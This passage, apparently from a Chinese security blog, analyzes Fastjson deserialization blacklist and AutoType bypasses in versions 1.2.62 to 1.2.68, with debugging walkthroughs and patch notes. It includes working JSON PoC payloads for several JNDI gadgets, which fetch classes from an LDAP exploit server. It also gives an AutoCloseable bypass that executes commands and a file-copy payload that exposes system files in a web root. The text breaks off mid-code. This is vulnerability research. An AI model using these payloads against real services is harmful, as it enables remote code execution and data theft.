一道题引发的无列名注入","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.mi1k7ea.com/tags/SQL注入/"}]},{"title":"（安全客首发）Fastjson系列六——1.2.48-1.2.68反序列化漏洞","date":"2021-02-08T09:23:33.000Z","path":"2021/02/08/Fastjson系列六——1-2-48-1-2-68反序列化漏洞/","text":"安全客首发：浅析Fastjson1.2.62-1.2.68反序列化漏洞 0x00 前言之前出现了很多1.2.47之后一些版本的新Gadget和绕过利用，最近有点时间就来补充学习下吧，黑名单绕过的Gadget主要参考threedr3am大佬的。当然，每个版本绕过黑名单的Gadget有很多，这里就挑几个外界已爆出的来看看就好。 0x01 1.2.62反序列化漏洞（黑名单绕过）漏洞原理新Gadget绕过黑名单限制。 org.apache.xbean.propertyeditor.JndiConverter类的toObjectImpl()函数存在JNDI注入漏洞，可由其构造函数处触发利用。 PoC： 1&#123;\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://localhost:1389/Exploit\"&#125; 前提条件 需要开启AutoType； Fastjson &lt;= 1.2.62； JNDI注入利用所受的JDK版本限制； 目标服务端需要存在xbean-reflect包； 漏洞复现漏洞代码示例： 123456789101112package vul;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class PoC_1_2_62 &#123; public static void main(String[] args) &#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String poc = \"&#123;\\\"@type\\\":\\\"org.apache.xbean.propertyeditor.JndiConverter\\\",\\\"AsText\\\":\\\"ldap://localhost:1389/Exploit\\\"&#125;\"; JSON.parse(poc); &#125;&#125; 开启LDAP恶意服务器和存放JNDIExploit恶意类的Web服务器，然后运行程序成功触发反序列化弹计算器： 调试分析直接在CheckAutoType()函数上打上断点开始分析，函数位置：com\\alibaba\\fastjson\\parser\\ParserConfig.java 相比于之前版本调试分析时看的CheckAutoType()函数，这里新增了一些代码逻辑，这里大致说下，下面代码是判断是否调用AutoType相关逻辑之前的代码，说明如注释： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758if (typeName == null) &#123; return null; &#125;// 限制了JSON中@type指定的类名长度 if (typeName.length() &gt;= 192 || typeName.length() &lt; 3) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125;// 单独对expectClass参数进行判断，设置expectClassFlag的值// 当且仅当expectClass参数不为空且不为Object、Serializable、...等类类型时expectClassFlag才为true final boolean expectClassFlag; if (expectClass == null) &#123; expectClassFlag = false; &#125; else &#123; if (expectClass == Object.class || expectClass == Serializable.class || expectClass == Cloneable.class || expectClass == Closeable.class || expectClass == EventListener.class || expectClass == Iterable.class || expectClass == Collection.class ) &#123; expectClassFlag = false; &#125; else &#123; expectClassFlag = true; &#125; &#125; String className = typeName.replace('$', '.'); Class&lt;?&gt; clazz = null; final long BASIC = 0xcbf29ce484222325L; final long PRIME = 0x100000001b3L;// 1.2.43检测，\"[\" final long h1 = (BASIC ^ className.charAt(0)) * PRIME; if (h1 == 0xaf64164c86024f1aL) &#123; // [ throw new JSONException(\"autoType is not support. \" + typeName); &#125;// 1.2.41检测，\"Lxx;\" if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125;// 1.2.42检测，\"LL\" final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME;// 对类名进行Hash计算并查找该值是否在INTERNAL_WHITELIST_HASHCODES即内部白名单中，若在则internalWhite为true boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, TypeUtils.fnv1a_64(className) ) &gt;= 0; 未开启AutoType时在前面的基础上进行调试。 由于未开启AutoType、未设置expectClass且类名不在内部白名单中，因此第一段判断逻辑（这是开启AutoType的检测逻辑）没进去执行： 往下，一系列的调用来尝试加载class，但并没有加载成功，看注释即可： 123456789101112131415161718192021222324252627282930// 如果clazz还为null，则尝试从Mapping缓存中加载clazzif (clazz == null) &#123; clazz = TypeUtils.getClassFromMapping(typeName); &#125;// 如果clazz还为null，则尝试调用findClass()来加载clazz if (clazz == null) &#123; clazz = deserializers.findClass(typeName); &#125;// 如果clazz还为null，则尝试从typeMapping中获取clazz if (clazz == null) &#123; clazz = typeMapping.get(typeName); &#125;// 如果在前面判断是在internalWhite即内部哈希白名单中，则直接加载clazz if (internalWhite) &#123; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); &#125;// 如果clazz不为空，且expectClass不为空、clazz不为HashMap类型、clazz不为expectClass的子类，则直接返回该类 if (clazz != null) &#123; if (expectClass != null &amp;&amp; clazz != java.util.HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; return clazz; &#125; 接着到了AutoType关闭时的判断执行逻辑，即这是不启用AutoType的检测逻辑： 此处先进行哈希黑名单过滤，然后进行哈希白名单匹配。由于该Gadget并不在黑名单中，因此能绕过此检测逻辑。 往下的代码逻辑如下，看注释： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768 // 这里通过ASM对指定class进行visit，并尝试获取JsonType注解信息boolean jsonType = false; InputStream is = null; try &#123; String resource = typeName.replace('.', '/') + \".class\"; if (defaultClassLoader != null) &#123; is = defaultClassLoader.getResourceAsStream(resource); &#125; else &#123; is = ParserConfig.class.getClassLoader().getResourceAsStream(resource); &#125; if (is != null) &#123; ClassReader classReader = new ClassReader(is, true); TypeCollector visitor = new TypeCollector(\"&lt;clinit&gt;\", new Class[0]); classReader.accept(visitor); jsonType = visitor.hasJsonType(); &#125; &#125; catch (Exception e) &#123; // skip &#125; finally &#123; IOUtils.close(is); &#125;// 设置autoTypeSupport开关 final int mask = Feature.SupportAutoType.mask; boolean autoTypeSupport = this.autoTypeSupport || (features &amp; mask) != 0 || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != 0;// 若到这一步，clazz还是null的话，就会对其是否开启AutoType、是否注解JsonType、是否设置expectClass来进行判断// 如果判断通过，就会判断是否开启AutoType或是否注解JsonType，是的话就会在加载clazz后将其缓存到Mappings中，这正是1.2.47的利用点// 也就是说，只要开启了AutoType或者注解了JsonType的话，在这段代码逻辑中就会把clazz缓存到Mappings中 if (clazz == null &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123; boolean cacheClass = autoTypeSupport || jsonType; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass); &#125;// 如果从前面加载得到了clazz if (clazz != null) &#123; // 如果注解了JsonType，直接返回clazz if (jsonType) &#123; TypeUtils.addMapping(typeName, clazz); return clazz; &#125; // 判断clazz是否为ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常 if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver || javax.sql.RowSet.class.isAssignableFrom(clazz) // ) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; // 如果是expectClass不为空且clazz是其子类，则直接返回，否则抛出异常 if (expectClass != null) &#123; if (expectClass.isAssignableFrom(clazz)) &#123; TypeUtils.addMapping(typeName, clazz); return clazz; &#125; else &#123; throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName()); &#125; &#125; // build JavaBeanInfo后，对其creatorConstructor进行判断，如果该值不为null且开启AutoType则抛出异常 JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy); if (beanInfo.creatorConstructor != null &amp;&amp; autoTypeSupport) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125; 再往下，clazz为null且AutoType为false就直接抛出异常找不到指定类了： 就这，未开启AutoType就无法成功加载恶意类达到攻击目的。 开启AutoType时和前面一样的，看看关键点。 这里是进入了第一个判断的代码逻辑即开启AutoType的检测逻辑，先进行哈希白名单匹配、然后进行哈希黑名单过滤，但由于该类不在黑白名单中所以这块检测通过了并往下执行： 往下执行，到未开启AutoType的检测逻辑时直接跳过再往下执行，由于AutoTypeSupport为true，进入调用loadClass()函数的逻辑来加载恶意类： 跟进TypeUtils.loadClass()函数中，这块是老相识了，其中通过AppClassLoader类加载器成功加载恶意类，且由于前面开启AutoType的缘故、cacheClass为true进而开启了cache缓存、使得恶意类缓存到了Mapping中，最后返回加载的类： 最后由于AutoType开启了、clazz不为null且满足其中一些判断逻辑，最后就直接返回该恶意类了： Gadget分析AutoType那块调试分析完了，之后就是反序列化调用恶意类相关函数了。 继续往下调试看到，是调用到了org.apache.xbean.propertyeditor.JndiConverter类的无参构造函数，其中调用其父类AbstractConverter的有参构造函数： 跟进其父类AbstractConverter中，既然都调用到父类构造函数了，结合前面的PoC中的AsText属性知道（JndiConverter类中并没有重写该属性的setter方法），是调用的AbstractConverter类的setAsText()函数来进行setter设置的： 其中调用了toObject()函数进行对象转换操作，跟进去看下： 其中调用了toObjectImpl()函数进行处理。而该函数在父类AbstractConverter中只是个抽象函数，在其子类JndiConverter中是实现了的，其中就是JNDI注入漏洞点： 至此，就触发了JNDI注入漏洞导致成功利用了反序列化漏洞。 此时函数调用栈如下： 123456789101112131415161718192021toObjectImpl:35, JndiConverter (org.apache.xbean.propertyeditor)toObject:86, AbstractConverter (org.apache.xbean.propertyeditor)setAsText:59, AbstractConverter (org.apache.xbean.propertyeditor)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)parseField:123, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)parseField:1241, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:866, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseRest:1555, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:-1, FastjsonASMDeserializer_1_JndiConverter (com.alibaba.fastjson.parser.deserializer)deserialze:284, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseObject:395, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1400, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1366, DefaultJSONParser (com.alibaba.fastjson.parser)parse:170, JSON (com.alibaba.fastjson)parse:180, JSON (com.alibaba.fastjson)parse:149, JSON (com.alibaba.fastjson)main:10, PoC_1_2_62 (vul) 补丁分析黑名单绕过的Gadget补丁都是在新版本中添加新Gadget黑名单来进行防御的：https://github.com/alibaba/fastjson/compare/1.2.62%E2%80%A61.2.66#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4 新版本运行后直接被抛出异常： 1Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. org.apache.xbean.propertyeditor.JndiConverter 在哈希黑名单中添加了该类，其中匹配到了该恶意类的Hash值： 0x02 1.2.66反序列化漏洞（黑名单绕过）漏洞原理新Gadget绕过黑名单限制。 1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。 org.apache.shiro.realm.jndi.JndiRealmFactory类PoC： 1&#123;\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"Realms\":[\"\"]&#125; br.com.anteros.dbcp.AnterosDBCPConfig类PoC： 123&#123;\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"&#125;或&#123;\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"&#125; com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC： 1&#123;\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": &#123;\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1389/Exploit\"&#125;&#125; 前提条件 开启AutoType； Fastjson &lt;= 1.2.66； JNDI注入利用所受的JDK版本限制； org.apache.shiro.jndi.JndiObjectFactory类需要包； br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包； com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包； 漏洞复现漏洞代码示例： 12345678910111213141516package vul;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class PoC_1_2_66 &#123; public static void main(String[] args) &#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String poc = \"&#123;\\\"@type\\\":\\\"org.apache.shiro.realm.jndi.JndiRealmFactory\\\", \\\"jndiNames\\\":[\\\"ldap://localhost:1389/Exploit\\\"], \\\"Realms\\\":[\\\"\\\"]&#125;\";// String poc = \"&#123;\\\"@type\\\":\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\",\\\"metricRegistry\\\":\\\"ldap://localhost:1389/Exploit\\\"&#125;\";// String poc = \"&#123;\\\"@type\\\":\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\",\\\"healthCheckRegistry\\\":\\\"ldap://localhost:1389/Exploit\\\"&#125;\";// String poc = \"&#123;\\\"@type\\\":\\\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\\\",\" +// \"\\\"properties\\\": &#123;\\\"@type\\\":\\\"java.util.Properties\\\",\\\"UserTransaction\\\":\\\"ldap://localhost:1389/Exploit\\\"&#125;&#125;\"; JSON.parse(poc); &#125;&#125; org.apache.shiro.realm.jndi.JndiRealmFactory br.com.anteros.dbcp.AnterosDBCPConfig com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig 调试分析这里只看Gadget关键点。 org.apache.shiro.realm.jndi.JndiRealmFactory根据PoC：{&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;Realms&quot;:[&quot;&quot;]} 先调用了JndiRealmFactory类的jndiNames属性的setter方法进行设置： 往下继续反序列化操作，解析到存在Realms字段时，就调用到了JndiRealmFactory类的getRealms()函数，其中存在JNDI注入漏洞： 一个问题——为啥会调用到Realms的getter方法呢？ 这是因为Realms的getter方法返回值类型就是Collection，满足Fastjson反序列化调用的getter方法的结论，因此能在反序列化的过程中调用到该getter方法。 br.com.anteros.dbcp.AnterosDBCPConfig根据PoC：{&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;}或{&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;} 先调用metricRegistry属性的setter方法，看到其中以属性值为参数调用getObjectOrPerformJndiLookup()函数： 跟进getObjectOrPerformJndiLookup()函数，存在JNDI注入漏洞： 另一个属性healthCheckRegistry同理： com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig根据PoC：{&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: {&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://localhost:1389/Exploit&quot;}} 直接调用属性properties的setter方法，其中获取类型为Properties的键名为UserTransaction的内容，并直接传入lookup()函数中导致JNDI注入漏洞： 补丁分析添加对应的哈希黑名单：https://github.com/alibaba/fastjson/compare/1.2.66%E2%80%A61.2.67#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4 0x03 1.2.67反序列化漏洞（黑名单绕过）漏洞原理新Gadget绕过黑名单限制。 org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC： 1&#123;\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://localhost:1389/Exploit\"], \"tm\": &#123;\"$ref\":\"$.tm\"&#125;&#125; org.apache.shiro.jndi.JndiObjectFactory类PoC： 1&#123;\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://localhost:1389/Exploit\",\"instance\":&#123;\"$ref\":\"$.instance\"&#125;&#125; 前提条件 开启AutoType； Fastjson &lt;= 1.2.67； JNDI注入利用所受的JDK版本限制； org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖； org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖； 漏洞复现漏洞代码示例： 12345678910111213package vul;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class PoC_1_2_67 &#123; public static void main(String[] args) &#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true);// String poc = \"&#123;\\\"@type\\\":\\\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\\\", \\\"jndiNames\\\":[\\\"ldap://localhost:1389/Exploit\\\"], \\\"tm\\\": &#123;\\\"$ref\\\":\\\"$.tm\\\"&#125;&#125;\"; String poc = \"&#123;\\\"@type\\\":\\\"org.apache.shiro.jndi.JndiObjectFactory\\\",\\\"resourceName\\\":\\\"ldap://localhost:1389/Exploit\\\",\\\"instance\\\":&#123;\\\"$ref\\\":\\\"$.instance\\\"&#125;&#125;\"; JSON.parse(poc); &#125;&#125; org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup org.apache.shiro.jndi.JndiObjectFactory 调试分析这里只看Gadget关键点。 org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup根据PoC：{&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;tm&quot;: {&quot;$ref&quot;:&quot;$.tm&quot;}} 先调用jndiNames属性的setter方法，注意这里接收参数类型是List，因此构造对应的值需要是数组形式： 往下调试，会调用到tm字段的getter方法，其中存在JNDI注入漏洞： 这里就很奇怪了，getTm()函数其实并不满足Fastjson反序列化自动调用满足条件的getter方法的，那么它为啥会执行呢？ 来看下面分析。 Fastjson循环引用Fastjson支持循环引用，并且是默认打开的。参考：https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8 在Fastjson中，往JSONArray类型的对象里面add数据时，如果数据相同，那么就会被替换成$ref，也就是被简化了，因为数据一样所以直接指向上一条数据。 $ref即循环引用：当一个对象包含另一个对象时，Fastjson就会把该对象解析成引用。引用是通过$ref标示的。 语法 描述 {“$ref”:”$”} 引用根对象 {“$ref”:”@”} 引用自己 {“$ref”:”..”} 引用父对象 {“$ref”:”../..”} 引用父对象的父对象 {“$ref”:”$.members[0].reportTo”} 基于路径的引用 那这样就清楚了，org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC中后面那段的{&quot;$ref&quot;:&quot;$.tm&quot;}，实际上就是基于路径的引用，相当于是调用root.getTm()函数，进而直接调用了tm字段的getter方法了。 PS：threedr3am大佬tql！ org.apache.shiro.jndi.JndiObjectFactory根据PoC：{&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;instance&quot;:{&quot;$ref&quot;:&quot;$.instance&quot;}} 先调用resourceName属性的setter方法设置属性值： 往下，就是和前面同理的，通过&quot;instance&quot;:{&quot;$ref&quot;:&quot;$.instance&quot;}即循环引用来调用instance的getter方法，其中存在JNDI注入漏洞： 补丁分析添加对应的哈希黑名单：https://github.com/alibaba/fastjson/compare/1.2.67%E2%80%A61.2.68#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4 0x04 1.2.68反序列化漏洞（expectClass绕过AutoType）这部分只看新的绕过AutoType的东西即expectClass。 漏洞原理本次绕过checkAutoType()函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过checkAutoType()函数执行恶意操作。 简单地说，本次绕过checkAutoType()函数的攻击步骤为： 先传入某个类，其加载成功后将作为expectClass参数传入checkAutoType()函数； 查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用； 前提条件 Fastjson &lt;= 1.2.68； 利用类必须是expectClass类的子类或实现类，并且不在黑名单中； 漏洞复现简单地验证利用expectClass绕过的可行性，先假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable： 12345678910111213141516package vul;public class VulAutoCloseable implements AutoCloseable &#123; public VulAutoCloseable(String cmd) &#123; try &#123; Runtime.getRuntime().exec(cmd); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Override public void close() throws Exception &#123; &#125;&#125; 构造PoC如下： 1&#123;\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"vul.VulAutoCloseable\",\"cmd\":\"calc\"&#125; 无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行： 调试分析直接在CheckAutoType()函数中打断点开始调试。 第一次是传入java.lang.AutoCloseable类进行校验，这里CheckAutoType()函数的expectClass参数是为null的： 往下，直接从缓存Mapping中获取到了java.lang.AutoCloseable类： 看到该类是默认存在Mapping中的： 往下就是判断clazz是否不是expectClass类的继承类且不是HashMap类型，是的话抛出异常，否则直接返回该类。这里没有expectClass就直接返回java.lang.AutoCloseable类： 接着，返回到DefaultJSONParser类中获取到clazz后再继续执行，根据java.lang.AutoCloseable类获取到反序列化器为JavaBeanDeserializer，然后应用该反序列化器进行反序列化操作： 往下，调用的是com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java的deserialze()函数进行反序列化操作，其中type参数就是传入的java.lang.AutoCloseable类： 往下的逻辑，就是解析获取PoC后面的类的过程。这里看到获取不到对象反序列化器之后，就会进去如图的判断逻辑中，设置type参数即java.lang.AutoCloseable类为checkAutoType()函数的expectClass参数来调用checkAutoType()函数来获取指定类型，然后在获取指定的反序列化器： 此时，第二次进入checkAutoType()函数，typeName参数是PoC中第二个指定的类，expectClass参数则是PoC中第一个指定的类： 往下，由于java.lang.AutoCloseable类并非其中黑名单中的类，因此expectClassFlag被设置为true： 往下，由于expectClassFlag为true且目标类不在内部白名单中，程序进入AutoType开启时的检测逻辑： 由于vul.VulAutoCloseable类不在黑白名单中，因此这段能通过检测并继续往下执行。 往下，未加载成功目标类，就会进入AutoType关闭时的检测逻辑，和上同理，这段能通过检测并继续往下执行： 往下，由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，但是由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的： 跟进该函数，使用AppClassLoader加载vul.VulAutoCloseable类并直接返回： 往下，判断是否jsonType、true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制： 前面的都能通过，往下，如果expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断： checkAutoType()调用完返回类之后，就进行反序列化操作、新建恶意类实例进而调用其构造函数从而成功触发漏洞： 小结：当传入checkAutoType()函数的expectClass参数不为null，并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中），就将需要加载的目标类当做是正常的类然后通过调用TypeUtils.loadClass()函数进行加载。 实际利用前面漏洞复现只是简单地验证绕过方法的可行性，在实际的攻击利用中，是需要我们去寻找实际可行的利用类的。 这里直接参考b1ue大佬文章，主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。 我寻找 gadget 时的条件是这样的。 需要一个通过 set 方法或构造方法指定文件路径的 OutputStream 需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream 需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法 以上三个组合在一起就能构造成一个写文件的利用链，我通过扫描了一下 JDK ，找到了符合第一个和第三个条件的类。 分别是 FileOutputStream 和 ObjectOutputStream，但这两个类选取的构造器，不符合情况，所以只能找到这两个类的子类，或者功能相同的类。 复制文件利用类：org.eclipse.core.internal.localstore.SafeFileOutputStream 依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt; &lt;version&gt;1.9.5&lt;/version&gt;&lt;/dependency&gt; 看下SafeFileOutputStream类的源码，其SafeFileOutputStream(java.lang.String, java.lang.String)构造函数判断了如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中，正是利用其构造函数的这个特点来实现Web场景下的任意文件读取： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115public class SafeFileOutputStream extends OutputStream &#123; protected File temp; protected File target; protected OutputStream output; protected boolean failed; protected static final String EXTENSION = \".bak\"; public SafeFileOutputStream(File file) throws IOException &#123; this(file.getAbsolutePath(), (String)null); &#125; // 该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中 public SafeFileOutputStream(String targetPath, String tempPath) throws IOException &#123; this.failed = false; this.target = new File(targetPath); this.createTempFile(tempPath); if (!this.target.exists()) &#123; if (!this.temp.exists()) &#123; this.output = new BufferedOutputStream(new FileOutputStream(this.target)); return; &#125; this.copy(this.temp, this.target); &#125; this.output = new BufferedOutputStream(new FileOutputStream(this.temp)); &#125; public void close() throws IOException &#123; try &#123; this.output.close(); &#125; catch (IOException var2) &#123; this.failed = true; throw var2; &#125; if (this.failed) &#123; this.temp.delete(); &#125; else &#123; this.commit(); &#125; &#125; protected void commit() throws IOException &#123; if (this.temp.exists()) &#123; this.target.delete(); this.copy(this.temp, this.target); this.temp.delete(); &#125; &#125; protected void copy(File sourceFile, File destinationFile) throws IOException &#123; if (sourceFile.exists()) &#123; if (!sourceFile.renameTo(destinationFile)) &#123; InputStream source = null; BufferedOutputStream destination = null; try &#123; source = new BufferedInputStream(new FileInputStream(sourceFile)); destination = new BufferedOutputStream(new FileOutputStream(destinationFile)); this.transferStreams(source, destination); destination.close(); &#125; finally &#123; FileUtil.safeClose(source); FileUtil.safeClose(destination); &#125; &#125; &#125; &#125; protected void createTempFile(String tempPath) &#123; if (tempPath == null) &#123; tempPath = this.target.getAbsolutePath() + \".bak\"; &#125; this.temp = new File(tempPath); &#125; public void flush() throws IOException &#123; try &#123; this.output.flush(); &#125; catch (IOException var2) &#123; this.failed = true; throw var2; &#125; &#125; public String getTempFilePath() &#123; return this.temp.getAbsolutePath(); &#125; protected void transferStreams(InputStream source, OutputStream destination) throws IOException &#123; byte[] buffer = new byte[8192]; while(true) &#123; int bytesRead = source.read(buffer); if (bytesRead == -1) &#123; return; &#125; destination.write(buffer, 0, bytesRead); &#125; &#125; public void write(int b) throws IOException &#123; try &#123; this.output.write(b); &#125; catch (IOException var3) &#123; this.failed = true; throw var3; &#125; &#125;&#125; PoC： 1&#123;\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"tempPath\":\"C:/Windows/win.ini\", \"targetPath\":\"D:/wamp64/www/win.txt\"&#125; 攻击利用： 写入文件写内容类：com.esotericsoftware.kryo.io.Output 依赖： 12345&lt;dependency&gt; &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt; &lt;artifactId&gt;kryo&lt;/artifactId&gt; &lt;version&gt;4.0.0&lt;/version&gt;&lt;/dependency&gt; Output类主要用来写内容，它提供了setBuffer()和setOutputStream()两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其flush()函数： 1234567891011121314151617181920212223242526272829303132/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes. * @param outputStream May be null. */public void setOutputStream (OutputStream outputStream) &#123; this.outputStream = outputStream; position = 0; total = 0;&#125;.../** Sets the buffer that will be written to. &#123;@link #setBuffer(byte[], int)&#125; is called with the specified buffer's length as the * maxBufferSize. */public void setBuffer (byte[] buffer) &#123; setBuffer(buffer, buffer.length);&#125;.../** Writes the buffered bytes to the underlying OutputStream, if any. */public void flush () throws KryoException &#123; if (outputStream == null) return; try &#123; outputStream.write(buffer, 0, position); outputStream.flush(); &#125; catch (IOException ex) &#123; throw new KryoException(ex); &#125; total += position; position = 0;&#125;... 接着，就是要看怎么触发Output类flush()函数了，flush()函数只有在close()和require()函数被调用时才会触发，其中require()函数在调用write相关函数时会被触发。 其中，找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其setBlockDataMode()函数中调用了drain()函数、drain()函数中又调用了out.write()函数，满足前面的需求： 1234567891011121314151617181920212223242526272829303132333435363738394041 /** * Creates new BlockDataOutputStream on top of given underlying stream. * Block data mode is turned off by default. */ BlockDataOutputStream(OutputStream out) &#123; this.out = out; dout = new DataOutputStream(this); &#125; /** * Sets block data mode to the given mode (true == on, false == off) * and 